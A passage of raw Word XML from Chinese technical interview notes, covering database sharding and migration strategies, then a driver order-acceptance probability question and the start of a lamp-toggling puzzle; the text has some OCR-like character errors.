        <w:t>承载量</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="309" w:lineRule="exact"/>
        <w:ind w:left="380" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>分表：大量的写操作在单表的情况下很容易堆积大量数据</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>假设单表存储</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>600w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>数据， 整个查询的速率都会下降，整个性能都</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-CN" w:eastAsia="zh-CN" w:bidi="zh-CN"/>
        </w:rPr>
        <w:t>会下降</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>。怎么办？分表。把这么大的表进行拆分, 拆分可以用垂直和水平拆分。垂直拆分就是把一个表的字段往小了拆，把查询高频字段 保留低频拆成一个表，需要低频数据直接緩存篁。水平拆分就是把表砍成几段，也就是 这样的分表是在表结构一样的前提下分表，按照表的唯</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>一id</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>进行划分</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="309" w:lineRule="exact"/>
        <w:ind w:left="380" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>分库分表场景：例如在大型互联网公司有上亿的用户，这么高并发大数据的进行对数据 库的操作需要进行分库分表，首先假设现在已有</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Iw/sQPS</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">进行分库分5个库，一张表 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>1000w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>数据，先进行每个库的分表水平分5个表给每个库，在每个摩里面在水平分4个 表也就是现在每个表才50</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>数据，怎么分呢，可以用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>hash,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>也可以用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>range,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">hash </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>就直接</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>hash</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>路由</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>id</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>到对应的库的对应的表，也就是现在有5个库20张表，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>hash</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>路由 先%5找库，在%20找表</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="310" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="380"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>分库分表问题：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="44"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="310" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="380"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="309" w:name="bookmark318"/>
      <w:bookmarkEnd w:id="309"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>如果之前进行架构时是单表单摩但是因为业务量増加需要分库分表怎么办？</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="45"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="715"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="310" w:lineRule="exact"/>
        <w:ind w:left="380" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="310" w:name="bookmark319"/>
      <w:bookmarkEnd w:id="310"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>停机维护，及其不建议（这个停机肯定至要在没人的时候也就是凌晨开始加班到第二 天早上，不好不好对身体不好）。首先写个后台程序去吧数据库数据全部读出来，按照 分库分表的架构把摩和表搭起来，然后把全部的数据按照</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>hash</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>或者</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>range</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>的方式进行 数据划分，如果按照</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>hash</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>路由，就直接程序跑起来</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>id</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>取模找对应的库和表存储。这个 方法不仅伤身体还费力，如果在早上5前这个数据还没分完那就没办法了直接按照原先 的单摩单表运行然后在等下一个天亮。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="45"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="715"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="310" w:lineRule="exact"/>
        <w:ind w:left="380" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="311" w:name="bookmark320"/>
      <w:bookmarkEnd w:id="311"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>不停机维护，双写迁移。什么叫双写，就是在不影响用户的情况下进行分库分表操作。 怎么操作，首先一样的先把库和表结构搭出来，然后在系统后台开一个程序进行迁移， 在用户进行读写操作时，往旧库操作同时向新库操作。后台程序和用户读写同时进行操 作新摩，为了数据一致性在进行操作时激进型判断，这条数据是否存在不存在就插入存 在就看最后的修改时间按照最新的修改旺间数据进行存储</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="46"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="590"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="540" w:line="637" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="312" w:name="bookmark321"/>
      <w:bookmarkEnd w:id="312"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>我们在将某个订单送给某一司机之前，需要计算一下这 个司机选择接受这个订单的概率，现有</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>A,B</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>两个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="021E3F"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>订单，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>对某 一司机。已知；</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="47"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="410"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="240" w:line="470" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="313" w:name="bookmark322"/>
      <w:bookmarkEnd w:id="313"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>如果只将订单</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sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>播送给司机，司机接受的概率是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Pa;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="47"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="410"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="60" w:line="470" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="314" w:name="bookmark323"/>
      <w:bookmarkEnd w:id="314"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>如果只</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="021E3F"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>将订单</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sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>播送给司机，司机接受的概率是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Pb;</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[1-(l-Pa)*</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>1-Pb</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>]*P a/(Pa+Pb)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="160" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>(l-p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:vertAlign w:val="subscript"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>)*(l-pb)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>是两个单都不接的概率，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>l-(l-pa)*(l-pb)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>是接单的概率</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Pa/(Pa+Pb)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>是 在两者中选择</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Pa</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>的概率</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="31"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="46"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="590"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="300" w:line="630" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="315" w:name="bookmark324"/>
      <w:bookmarkEnd w:id="315"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>2015</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>盏灯，一开始全部熄灭，序号分别是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>1-2015,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">先把 </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的倍数序号的灯的开关全部按一次，然后把</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
